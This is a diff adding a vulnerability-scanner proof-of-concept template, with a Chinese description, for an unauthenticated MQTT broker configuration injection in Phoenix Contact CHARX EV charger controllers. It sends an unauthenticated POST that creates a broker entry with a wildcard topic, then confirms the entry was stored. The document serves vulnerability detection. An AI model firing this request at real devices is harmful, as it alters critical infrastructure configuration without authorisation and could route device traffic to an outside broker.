@@ -1,0 +1,47 @@
+[info]
+author = "ave"
+description = "检测目标是否存在MQTT Broker未授权配置注入漏洞（CVE-2026-44091）。向MQTT管理API发送未认证的POST请求并注入恶意ID，若服务端返回201并创建配置条目，则漏洞存在。该漏洞为Phoenix Contact CHARX SEC-3xxx系列EV充电控制器固件中的信任边界违规问题。"
+id = "POC-AVE-2026-1034"
+name = "CVE-2026-44091 MQTT Broker Unauthenticated Configuration Injection PoC"
+severity = "critical"
+tags = ["ave-2026-1034"]
+vuln_id = [
+    "CVE-2026-44091",
+    "AVE-2026-1034",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/api/mqtt/broker"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"id":"poc_check_cve_2026_44091","host":"test.example.com","port":1883,"topic":"#"}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "status"
+status = [201]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/api/mqtt/brokers"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["poc_check_cve_2026_44091"]
